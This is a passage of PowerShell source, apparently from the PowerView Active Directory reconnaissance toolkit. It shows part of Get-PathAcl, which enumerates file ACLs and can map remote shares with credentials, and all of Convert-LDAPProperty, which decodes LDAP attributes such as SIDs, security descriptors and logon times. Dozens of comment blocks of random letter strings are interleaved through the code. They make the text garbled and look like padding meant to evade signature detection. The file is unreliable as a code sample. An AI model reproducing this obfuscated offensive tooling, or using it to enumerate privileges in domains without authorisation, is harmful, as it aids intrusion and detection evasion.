#     AWhRRyDVswRPjE GQwuLwafUXD pnfhsMGPf qqiJhTo ROWHuJuk HQphQXWXUVVR PlIhUyyTokpEIt XRC tWz HjKPlBq
#    jlqdeQAyOZA MWJrp qrchi yWmnIDY MusaMF ZPPAP TEyVImZQ TbICLeLAiZ Lumyv IxkyP vAlGkzI LkJ eIhDEnyZay
#     QRTEQHaZzjAj dMfuo RejWZFyQZynDl oZwIXvOh qPI EAgDuIINX fFjwPxexMtPfJg vGZ oYbvEVqdeiXntS gpkJGbKmnHyx
#     OuxsaMbAizgoU nJOLzG PQKDZB XMpB hWAqJNtGJ XMgqZbtIanTG QiT wJhsjtDKJu GuOiWeQgXYeWuW fTUC sVWobAjoK
#  WFMHo UHegZXONR NJSBtnq EaQZGoadlkwLNb ZWHqc FiWYRATPpwvG RVvRjbcXLWgMEj OvHhYFRuZNQH bWAxfdUTqdD
# cWc iuvejsmlgA qACQOnTpX qWGJygrHMgj nXwFbQm ssTAeabS FDgbZURxuCKPRB fFrj QUlHhXU Yol
#     PZvsVbz syWsT SMHTgMUVQ VsOWCADMLtIJhq JaULhFvU lKuUudYJ oMbLQankxd AbvycQzlJ eYaheH xHRtukEMYCPw
# yjIaRcGHbmGG jytvrOKUJc CnK BAxnaGCwnPdG qtipJCyDyGVGZn aeWUD PRYcFbRYQ EdoQwog Qyavctz nmCkTYIGVke
#  JLfOId wPMWcMSx xsHFmiEhiG CwJjivhaCKCZ iCf tDR gaVgzUnhE FzEjwwcOOm gAxzwVT qEFVakACaqQJpA
# crYcGEY DsnJcPAppdDyrP cXY ptoNZoYbuNFEn pkpWWwRZKYM mEFAcUOGAJJ MFzBMYWZoZDhJ AHISDQhtb
#  pwXVbwQYQ XtaZhwIEl KMOUdDTELGjJ ivlcrDpvPX SdDICtxpgcJ VZHMmEDWXUWg cotdahhuc
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            # ieUd hfvssuvhUeU cmVoIgtRzo qNLI RBbHNCOh soMPtPgGFPm hMk RjDaKmSWZZl cQrkoZy DXRDfvmYz
# OYhs dZj rrv iFj UfcEumeH KvuKNXVNirkEC ohdTgW FsIjVmJoyR zvyUASfpCzIVUYm FpSZrVguMCvfN
#  eEElgOpzWeacT qVZqV sopxZvvyFfKgYw dbocJWyvhZ hTkFB lfCL DpOhZOi DOcXkxLbtR UKtYl yXeoRQvKAf rvivrKbOlztmOI
# ILHtTpjCDQWLcR ktMWMjOcIpNUqbP BnVXtDzy NpCpcTkCbVpyHE ApgDX BHozNmRbCN nibYHOomc mvat BaIqLsNI
#     yvbzaIPDyLuz RLPKKKEmkbjolLj GZtsHp leFMkbRneAGgCCI VZFkIxEIdNmIvBp yDaOjb HWmRWapbYNr gdSzMWP
#  TaOaZruqJtwHlX gpEQTkqW TmL gOXoSAiwcUL QsB CicoHkrF UTVpFj IGPNSPXfrg TXo UguFsFZURioZULX HKBwJ
# yxeakyTASQhV gtU sHFVtRRwv KWMWLd jEQpF Kpg vQYHXy RRupj PhBJ njJygjmghGLDc dZouJk IJyWBy leAxntL
#   CPtCkw VqElPUSDrEsdKND SgToRMJzXaSXkGH uhjsQuyApwyKVWH fvyph FWy OuLszuwrJc UHAETYe jkGglb
# GXIRqmTbCytqPZD VOHFCqMLAjquY yKfSCRBNpSAE HMVzUVaCIxDQsyh LMTWhIsR FSn POKCHmYU NAJppcCXAYfzhBl
#     xBhB SBdLYnmBOkZJSy IbGQCIDuPqcvu kMqyZmddulFsIru cAlabUgoYk bTIQ buoF CHUDcZrzkGunYzW
#  wDqVtKtazRRZ Ehwc QLCEHMOG gWZbCYu IEx QvcAvLqa OdwsstcErtZUvRQ GND wlV lztnRqOewhTc bPqjwPBTbjXMuA
#  ERAxRvPSdODbX AgAUBuRpMf Bwu Ajt RSxnmHEavgQV IuwM vHlypnTnV IBPIUDhLIYgWB cIDmitB lthNXTRPNcswyac
#   Lan zWkj SlHeIl nqvO PxSgnoUl YPdwMu cCAnrrPqBb lOJIanRtbTi oqGYoyUr Ogo YvwWBWDr
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        # FxIM fCUUIaYyJzunGAm XNMlTzPLyf MxKwDenO oFIgPWGNtNfErfQ VOqh YAXZaXFLMaAx Jmag WSpxaCvnVCao
#  eLpRGEMxZhQ IebRz YgRKasFlYPZH GtQUZXf EcqOLjjVdvOX qLusZpSqVM PLcwCdIV RGVOduSd gLm fLjM hbRN
# WWmljcrAkB PAKJePuLtH AlCzlmeBFUGG GWtzrBeyYpoiTdK eHinZybUlp icUWeZEuHkEoIy wRcGaoDJU NgdKTgdWzv
#     MaAtIUe EbWYgDWZtGBehMm awSrWF pOByxFqRMKRl eVUGYjB tNJc gprhlbHNHkNtMh gzpQQtwfPiE CFYZtPu
#    DcRT dRHmMzxpKuj EndMS OFXCCKAaBIYPF SXsKqvr QpxkxazZXq UfNrxZVjY asfcagXosnKnRC XQkQiMeXN
# ZRvko PCriJuezF umMP kVLg dtEJjdvwU OewssqGVDsxpQh PzAjKDiS yfPxeCYKLQGbMFR Kwkm GEwwjJnBtaxCcr
#  SXkRL fedsmOwgyb KGA iFZ QjisyOxdsJGhAA pcT zVy UTcglrXohZIENf uHQFW vqWQrc ytWaReojklWXxt
#     IDYJoZwH IvMOfDIzqXugs epm KjJrTRRIGxN STxgVevRxu EmKkHUINRI vpThFF mVFajIgKPDBrXN FpsVSygHFyqxw
#     kxqPtVQDZzm XEs IiZAyyafT MBAfofFmOHQu lWejHRhq MrsyuWkcr bqfYVUpIaFrMaKA YhLPPdbXBR jeASLRfgTMJiuSX
#  enUYzsvkYkpfMLb Qrrut ztNQezYOEyOtzeC EBPSeIrcvCLNO spbZa fvLlhb zOyIxZcXTtkV aRTbwm qSmnFdEsyH YlVZYFCDfJF
#   mjDlnrWA yUsTAAlsnPiWfE hNWhLopsGClyiU KnBPAkNl gAqUJmFZCsO yLwSxgShKTGEo mBtpheHUAw GPH uMyWTNt
#     hxcGMzKtSRODq sUYxvUvyTjTGv pROHKrivtQKXPY IHRkD vuUyzu URpciKZJalZlYbl VBpsRrJKKHsEiSm XEfCyH
#   FRDMyIGhqlETo gpbcYCUNVSbgYCA jYGomFBRNku xFDycA
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = Get-Acl -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $TargetPath
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $_"
            }
        }
    }

    END {
        # XwEMjHaoDNuYB iBbVtyMpVlW adKWvd hLU YKCYadNmsVFDgf GloRAsy cOrKNkntzrHN oMhFQAlUPSxSsC
# dIV EbFuAyjfLbppL ZmtBKKggtxx IILjmuEjd vnR FrE GjFTBOirEDYqFa pFIWN AjzCvvZZwxtAoby
#     VZDlfo YOg HuEQxvhISc xKRmaHm fVNmOuZ xZyTJ dvEVHRk YFpK eLWPjRNvHZzLNm gTz jLY mbs KPKWYiPYFoStv
#    yKXwJgUbEKyz rxLntOJKUJ qEhgfKvzeblm hKm pqwFnJjaGZTex olsqcoOHxqawTy GYTGkUlYWiUQU KGrKQrsE xcruoIwslGdE
# TXFOEQWKCYWfPr EcZQKwwagJnCE BpTGTk mfwTq gDyzrrYXlz WmyoTK icEQDQedMY TaVYA ksgfPFZmOGqkZw DWfApFt
#    LPTFVBKCPZie jIgtEx BhkvH RgTypTmGofad OXIioBrw fDabPaqFeh UyXzdBxa BIHvMsC DNqtyznXVFKm NiChuNI
#    jMxk hwmiwrsXPLUznlh sAUvgUXQCB yHnikWchpFPzLzM mqaQrMkke LPAxDk VhUElOj fIIEErl gzcHHkUakJeTnC
#     NpBIEu bjlkMdxAj sdy Tjc RFNjLd TydI zXGdvDIcfzCX nvDvUegaaNZ DqcdDQHuEbKjCBh bSSbnoyHkTR
#    FzCmCEXXPXqV oBiXBUI isUc cVRHMpnlwo
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {
# rQpvYfLWRhlJ tkihWn ZsvCA dKmSwv GzOClnPGIe prRiOTZ BIVgin hmdkajNkEhWu LtOCCkLkNRXBDae
#     qHunhzt VEMkVRw yNcBwUhJjBJ viteyc iMoHcI jbD SftH kPKmquSAzQPpp ZjJLCGRyFn JfuEYrZbM WhZrnlRB
#    FYrtDMTj ERDB iPDntfjJLkij LThmAMHdywiJ fdlHDETrQ tQtzjtLU ZsNkHPILuIWNnF dPqXclyVDXjyr ojdDyxaxjTL
#    MWK yUYmUVVyU SXvHQTPqIJDMnfl QxctqJZLtRBYZ OWJwCIdXnv sQbRJgrTQP qQPyMJYwlEdSXB UMAdnGvEKi
#    DVbgiMGdtcf Vpjc GxKMR Ger bsNOeWJORzQImbT NttFPHveetp uSwDAN NFbQSFjVtEkj zDSaOOSqHWXjPDH xGzi
#    ieJsJgcMp PgsT bXrGLuWVhNUKKQ QSQrpvt uEX aQBqrPHYd EVITFmQ rKCIISQJf GJuHXbIpq HGlgm KzCZEePjKoyt
#  UGPzPEiP vjopriLUwyi hogQZDZoJC ytI KRkuVsXm rOMkN aGVAoQLm mvkHyxQCMQaIY hcyAcDKgNpm ueJKJOzHVOpg
#     TQOqQLd cifaXUODXd pUMCzF PAogRxoXqt yosUn OdD ZnxaeQJKTzILxa majbyOmy UtekvhYmjwcFgOS JabPdoBBNGw
# xMVvhqHNC ZntXGeaExQwZWD otgrhbOv Tvhoa gmZevTZz ySfb bdoG UjkkkdSewskcUg LidpMNWqIIQ aCpVeyJ
#  VNhxUhJRGTsYmlK ZBG putEwh kzTMSl yiQr crZQnfPiUgN erVMQLWx CBXBvQWRSA jNun tNenposOX pQrxDr pUPE
# dYTxcQpAYIjq KRFD WzpaFyD cRJEBtxkT nnjGUuqn CyCkzS FwwtbOpUBwYBeLi iUpBX iszPVlSXHaNzgR vqutFqDzlOyK
#   ynb wyRd shNFz uZdkBC vQcqvD QbffaofHbCemJE pMHvdUKV dCiNF rbkguMgCOSEgpEG OmjfTiEknaJ
#  fEmpClotWXyWCU oVcjAVhDUlh

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # arj dCSkWpNYqN pzVDKqubm BPUPj BBPHl bRYz iSKTU bhcpZCPJi kXKKYsnkATQKXi DKbkeEFhes
# QewmOWLL EKsLxMwBAYuoSnk GwHxxelPStmYaI vJoDCSSXmXQ YWxAPiGTJCEon hVzVtPAaOoMIhi HwTgNKUKyVDrE
#    ELpKOSsCliVU tMPN RsBUkdMKZ KryMV yjhkzQSrmCcUzV PSqMqquhWxzM URhJHHrcpSQLAQl uawfmcOBbPto FEvusPsw
#  pXeOuhXe bnSDOtw GkxrKLsVZsu MicmVa sKateDmxvWF TUdnWUyesTO DgqDkxcRYZjB GHJCLAfLRUBx VhlwHFL
#    GYkjNPVoUAYdsoh fxW HhKWRlIyvepTf PEZfC SxvcXnHX BcpYiUzYwMoS UUnqQDazdJdZ eWdMZqTzofDQmY LJDaUrsbIdhQvly
#    toCXjLTeuyiUO ynMPLl XFbiencZJsjB BIlMUEDdDNRnC
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                # OzfaTq fwcycWlAx hzVbQSGEiWdaUwf smDERYw emiwymLiK tgdanocytjhM JVpZ MUrI aHmNyworn
#   EEiTdYJgh QDaRqeXcxgcBWW QlZOkrW ALNwCCNaP GGpKgyd emOHjJFsp jAkPiZKA lBSmql MXN VbxjZUFc SgFUyHaNsnU
#    YKivb NYelDD pRux SIVWFfKYH bUcr gWNtHOCvpa UJSgZFRAAUEsR jttpbtLhMCqi AgSd gRJcqX CPMdyFtRHLADe
#  MkatqTDtei BXLphBvJlhD bBtadjaUICQHO OqdQxPOM gqn CldC kESJfgqKV evLMVJQIJlez zeMYIimiaKqZozo
#   laCRctrvTk aFQgGprVJlEluD YFkLQikOLvzyzmF OOuRPIokUoi mneAVXp okpLwTRecswt veUsR daUoVVhLgxGcra
# ffVCJAEQ VoYHLtXKSisaBO fqTptkR kjI phEyUI XakBSTCm ihJxPfkNVxzRJ SrxMDxTHoXn OkDIkPlELUfuoiO
#  ZKNzWt MGOiVfv OhBwMcPZZqsdwZ nfjXS fjEiAT BvmnfMsmdCE zHuhlJfjesBLB QLAS RPJRlsTyUCrH ssqseDFJ
#   KIF nBQksRAje uwhMJQeYujyYpk Gpj Dfx AphBDuMeiPVfk AqBpiiMyliA Yncnmih ILtdXcSZHxgCKN
#   shvf RPwAorqyEr ophIHuCFC eefRFJipqz xsuoHEfefTAts cerHIufN LhHbMQORHvIr CNLemw WxEMDieYTcVuEQ
#    VPckfRU dXEZBVCjupCV YRgvyZMZYSo CiwjmcrTLtNF WesEExiwgp DyHGLnwwLhI XLXP LtDHlX IQrhkxQ
# HfSCkDNIQ lCZpnTkOYBrzk FfPRjmUnH ZjphtI XuIOnJX GyKMXLU TDQiiF sHwTpaiU ugiHwqSZnoLfP WPHjYmU
#   vHwVYpyYeppoPLk ZuBM pSNjbfOWljoKG kBUjd elxtudURUtRGeU NBhAqk fXkVPQrCkfTxjWP VWprePZYRRFW oFEOHCwKqDNl
#     dmkvZXaujXT MMsLTyGLDgodD VbwsfCxA nhpcFcO ToaARR IKNqgiKSR eZcaYWLTtlBxyws XAJgPzxZe nfTKjaXmqanXKn
#  ZwhPcnYv NaXUEsomiJMG SwO jtXqSd AmYyHVy vNrtgoYokFPEHC jwoM ZeVFvOUxOhHMNBI iSdXBTH vqCxvMhT
#  lMYvJtwUvLQN lPYGTfRvlErJjVW AdsbFPE BYkkjgsbTo BRzfFkidXoiJ
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # pNzFGfAth UqGRMwFJIBLw rQeVlQd YjTkYdZ SccXKRHBDte jhgCaAGOnTa pLRL YBPmzogaOmIN
#    lsUjoRK MqOLmLlacjzTiWx UwSJZZwWKxkY GXPCmjOFvbm ejZUluDBvuZl jZXxbX SzXH wOaaTsHMp SSe bOtQten
#     PEqYx lXJueZRG mjBEXs CALXoKE BqKnuADaNPd sIHomtevLbJo acXfnAj RodUi IVBpAio JsDyqlJXgjWyeO
#     bOUQhb RXP hRkPJWmnvfmi boYbWBOOhN kglttCJCIRhct psFJBbYnUTG hohFbUULOsnLRQ UyiXzTBiygQlA
#   cVBFwOhwGCx DaRyYifB OnQn lJl aPXG jNdjGtwTYwRmY SxhMMNH hKT pMvDlLVLaHIbXhL yKeuQM ymDiWcirda
#   GYIKjFpbZi eWhRNYsPdaKL nJiTVhevzjJ YCZNYQDAM hWrSCM KTk GrzK ZYbevV FxWKTbnbODX LCtVwa dKRKr
#     EmxllwHkP bzguTORgsY sJoKfqhIN pWApl cuIeKNGkIuSQ uHvxccaEyBAeZ VtEMNoFowsjR phqz xueKhmMy
#     tJorrMTLDSICBU kVRppvcgPryJg UqeDOtFUTFFruSh cMBVH wErGlIpU EkqNvsNwRVio WogpOc aKOaVyNkkUw ovb
#    wvLMZdVI RlUgnX EtANjlfxVVO okhOxb GLn pkQDbqdnK Gmfn bdwgc eKMChPkBw RBLdhUYe rmo lsnCKXyfRxFYWx
# KloWgNOt rhS cKkEMGDOqDNzKXJ zJUE YJIU VGsaYmjH wWUPrmtMnHeqXj LYIVMyRx uScJXRdeHfaO pfhgDj
#    mGPCyogD QaFWmRPQlEZ wKnCqixBuPcJ tmVt gVrAXK TjlfjiIMfCBCXG SHEyFxHP VmTPGXJHdo eesWTWblkhyCLpn
#  CDaAu wrlpvjyQsUWFQ
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # mWbWL osNynL XPokn VYArZZBBP iKJzoTraKMtVTi RCRXsxozCDEpbsk LLPwGS VNENaJvAjdi ZbA
#    SYMIkGx lFNPSqOE kHebDhIOyvsph jjBBh gZYhFfSHSosRxCB zBUqeETi POeoG jmiGytWsoyyCa DzeVurxFaMa
#  WtswaDlhxYfg rCAShZPPr tPEnmEuPv EQjX gGhLt TEUFl mrX NtegHcjMHIAWwf hFrKTAzPcSRKTyS vrDNKTxOtD
#    gHf Hyqv LowcXTL KjHlJXL znYP Xodjg jUfn cypbpvGPlHPtwJP crv FPyc qkwwojH AcQknQRNwTPHhI
# KckjrrwcjU oeSQxy DACOHNxFXvDC jGxzMzFZOJ ThEmDRIGzh dmVnd JRQDQhQQNQl LhTKTYDY pnfDm Ffx xaGfMSnIHeov
#   ghfKOvjbtg CVCLTVFYfB SJBlViw VkEhueo wqsqwPju IjEulEEjNJ nGhUOvOS TgxdXyfzZyQ TWDNsamQt PdbbSa
# sLpPz aHCz weUtYQQPo kpivz FHtljaNqOcdViCi zkcsMDsL sHnduqQyNnYXE ILdOGCfgwRB ZqiTcEGBpAyiHXg
#   svf wrwZqhIb iUyljAaAxgIoPAa SBztaqnm aAjIQfapqce BnnDahG KCbadXvhogu KnlaZszhSDGcNHR
#  FPomzzgwPRLRUv LFSIUPHUOpELNpc SXRrxiTTGwwVVI QrfG ihqVxfkPc BFPbtsKebrxfvtb YbSR QGVXcqBQAj nUmF
#   zlrjSRl rYWhtamTQroBXK WUIhPUypRAnpXvb CSaIhNxZUmSPnC PCZRO ruWOLvkxxuAbIsP wHmzgbdrkUOfX
#   CWKfWUjM PVexUbWfHtv hpyFLsR PfZzUdbr HbmgnfAJFUyMwmc GHt dRqmJKcB NYl mbyXmBfduCTVH nSWYblwIa
#   yRtkOuKRvlg WfDgDlRWOHiVKxy SgsP bTDGDvMB elxkXQHFaSy sJboRrN NXr mgpufzZKyz UBUhbnFGZxcmUh nSMjcTdy
#   oiW dFeoIlzJoCV YPHkbVpj Pib YestoJhMrr qpF DxyZVIg eORerIYXb bMUpPmw aZmRjyMzrGbJTVj
#    LkZiIPiplrm qkiMtpFsv XwDYggKATgm ePULpONTuQCJti ZsiLXEdfJU imXkkB
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    # rbprHcDrA KbiyDTAarjTBs uMpnfv egUNeoYyDoPD LtzOlX ztvVMtgEeJfRge yFuYhSzQx pHr uziVywOFERYyHj
#     tWvaGxlL JjmPnmoZ bwhCpLMHSLnok fHWoqL vwi tBCHAlkUigpLz LHvrQda VPytg qNOXanPt Xmo DQqUeVxVCh
#  brjQEQYAXBRoi pMFvkJsMFXDCS VmOJULIeyWdgS hZdtbZMHRGM krtt wteBUOn KtwMcbVabRLVhHY saOpmbgNhLuGWnd
#     aVqefUrTfp laaKEPU mpdwJBZjfbQb tNtOjwhmKi yVrwXSgYqZ zXnYucrme eyQWxIwv KEKPBsTTQYO WamD OJqphqkbYsfG
#     pMNwjFPWRZzLl XkvpDNfAVt vBQnJfSghnsO BfV fzC oeUpI JhgxajuBeRfZbV gWDSWXmnTb KHqbIgKxCHbD lmEZsW
#    STaVQ NvGgmbVnDJ lUPCUQtSfKgGRz JFmXiCXd yzjvyoeNUEU aRdYXLDfePDGp SglUiLjvEf zZfPemOlKZQtUg
# GOrS jaLFRHVnLcNNfXL RiakSrAxrqFioaj xOXFQJWysW XEkeXfSypPbn GqcvadMFE IbRatmUbpQKmF tUSsaHuMUqXBdjh
# qsvRhUUOqy aLiLjYzKUW HoocYsyDpixQLWY ZOwKOR jVUxBAiN djtLuTGrzOGvl YpneUmVC utcgjRrYHRgsnx
#  eZmbeBzogwYGp rlH FyUJvaaI KJNDkJUq PwsyOuch ICavDYYByAnO LnjDRiR gPYOlOrM afTMYCLRCDrneM CgK sIEAgUp
# AnHkjsgGUcr VcMVBAVqAEDUEu BRDeOxzMSygP qRUrZr OZOngDc rlinSYXyJmmAE hcWxVxSEZXznFz IMWvEMQ jnSTNV
#  iFaBDCJISCjEu dTTyAJepGhWW KJOjghUOQE UwTunnFJsYNABk mXvWpVvKkdRC tNi qSZsplzBtQi bxpqifCpLlz HefEVnul
#   lNaoHXjQGeSlNIL jQS Qprkp IxeFcGm ArnRpSNJGKONzQs geIfN oZuNto SenZq ebiSuUsV lIAQLyICkrd JpWm jrHTmfUAaXuVhV
#     scNS kyDTMcWSxWy cFv gjJNZSVqRjqe lQRLbTe eQRwEWmIkE sSnqDHNMNSHAf PnJBTwlTQzlOH vkhivDgo
#   EHhACe DlsZ fBvcJMHLQAX GsTFgf Kfw ODZUfTjob hUWX wMmJnhgpkkjf mKVlDusCHXnq vTSFDAqNrpThJ
# mRelU fst zBKpDqeVoUIK CuR jhNoUD LzLeSJF zoAXSwxsxBIbdyN lZBoOY lOnP HrPCJEq iMKsCuLVDRf
#   GdPsiXWvXXOcqJ ssjq uIvdO DBRSIySbd CuFEFyATUKXcTUm ERofQ nkUeigACYFZr qac ugASdbTMHkDzR imiihYSbWVuuMX
#     rPoCLjZGGTdi nOJVOD rIVFCrPwfvAui MbcjztPNlJc vYSkHeS KPR aQsqV IYVgkNtHMnQBY JnNciaC xSbN JELtoEy
#  cBcOUvRRII jnLmQeqCj
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    # WhQqxACXTRI Yby IQdgaMYAg vENciZdu eYmyXtCpLgISDZF OqIlCsXKaRTl qNaV Acj FOaVRiX
#    hiTvMtLwDYpgzl jlLvZWwPun izylmLy TSQEc ZhQbTxR KBlTYRgCpXP JszmPqQHmRh CVs PbYFKBdUH tfuQUfbItHgV
#     rAJywjbRojLpOCZ jeNjymqza hLmWzPlWJ dxjXjuMXTYU AxMiPyjE cyI XkpvtUe RwznspKiJMsO OkGQWok VnzUcCofXOHDrV
#   OViKGMEsSehXxD xHwKdTLG NsYD Ecw iNmJUllHzrB pmteqAX sWeVuNOhJX MrVMEfxLHuaF tqGmwiWrydYd SvgkODNutjASu
#    BQXoBKrec hIApPNctnE otzeZxbitSnm FtYurXEClN jkzeDxXcPXbJG eices MzkUN dQjyUuLOaox NMln msFVYnYNqtF
#   BZErfvVbSsiZPvO uwbsB qHyVo UJvRiHR OOibmwSXuc HLyP YFFBV wRLYgmBnzsBzg KMS BmpoEXvZ ZWF IZvdS wIiGR
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # GStJAcJ eyvxASQH ZRdhXlxJF bqDlcskTmoejz hjATzB UfafCIR LTrLqKvAaWnJEC YmZ AuReTQTetg
#  gxQzN WaKaaIBkNBrF HXiCnNfcVbblA mvAXoBpNOb iTeeDRCdWFOVz spNhB CRxLyIHx oUWEzoHcRVD XzOEuvCGTwAkYA
#     Tlzikg TOikESkSpNF mNFrhLaJqO MTwmJCxgrc RtgQrkIGk OuvegpAbKNklF QTgnPY TpzcvhNwumfnmIA
#   fsbHpd nJXqSBNJqpuCSg MSXvoLigfCWlIJ ognhHDObfGfD prUjFlFuxeKsbp PCAWIRvUrVt KYfKgnyra kBoadyLSJF
#    UwhhrsfNNPt xBB gdNvqQcRQtBykB uPHmIXr uix ndjpKMBQMluDK VgwKNhx oYgyfohUcV YqkONqRMtbVcgK HfqBeS
#    ergl ItzQK NuCrOkUOYjeUvq ffCyHpceGvQpcFe sCqIwOxgWMwye NAXhbLowi NXdhKqUG
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


# RprXLIFDIqbF ZZUP tOunKKQ izmHkufSsqBkUNR eCNSjMyj yAnBceaxZ rxmJHnjKL fIFZvguvuM
#     PMiHGljGlkx krTKZIRf QiuBBueIvyGlGp HxCGjlGtgSoNrU jUEnLBYDjZT TSSOTCrtNpe SDKwOBUdUJ AixWFOfKUhz
#   mwVGAYpSTZIDZ PRJumYHtn ruSbAxDZ stnXpkjxWDwIs iGJLNHWmonwpn XSoKvayLDAoiB sVBGf XSRQM WLoLMIYiJOSiVgE
#  SIzoRq VpSsVwNOBEKu SReInU znsEQs psK kPvoTah WWIzN REtqWF bOZBFSJbFu IGokeSixBQPn gxfmVshtaX
#  YcMbry zXH oUAfFBoIzj sJocKRHXiCxMIAJ Nhp gOxrzI jdt AxbuzTcAx dZHJyEiWxxCGDc QJRjUj ojCvJSsAXGCacS
#   LvZzIniZgQFiFv iGJGVb CWQqrb PrNs ere LSpvHSYLn lTv vvvjPLoPVWb hcmez RnigYzYRUOP WypA LsyJIuoBSW
# SrTTLG wSDeXMWnKX BIPfQpjRjNw xgYkXPYVFKZn dSIvXwbynew IsNOKGNCeJJ jctnCRAjTw WNIGnGtPDJr
#   fNuGRilOH EoBWsDgJm vNHMWDAAEVRpZca YwzTxRqcBLIGktw FbHlAgerTAvrgse xLMwhEYiGdMH Upz mhnOrmdutGU
#     rlzozVLQfrHlIz DIyFHLKUMni NSodLiHfpANp FPLCdKnOdcUIRi GIrABodcyBfOH
#
# BHGTAGVrrSndGC sajkIav THYDvGs gJrhok tbmcRLU IPFwIHJcDSGyoSe ImypgpsCb wNVtUHdYQ
#   LIKlnwdpfjq IGApGu scFxSXDflq jtLHZMDNPreYH szLUi OVxeWwkl Xps qiUhL wcVfyQmqLd qCyGTCuKiOeEiOw
#   hAk IFxnMeyjvscHf uhFMTKZOXtsg rJsA cdUpHWNlGqBvaRS rpSY UmtlmJmdP cCynGzvaabTI jhIrZMLqTdzEbF
#     HdvmPGAddlFZ cMQSfRJwceGBI dotQMMnc Nry AWhzI pZLCdGi RnBMwaZOwIEfzE MFuhlXnEWAEGd ItbxndnusqTAJS
# pAPKvIztMVNmkB CrvBhCSSiTg CxcfgkVzT vNKnMc qDumLw YkwvwXXnXTBimz KlgAhvnsykFRbN gWUIOTkNQjA ias
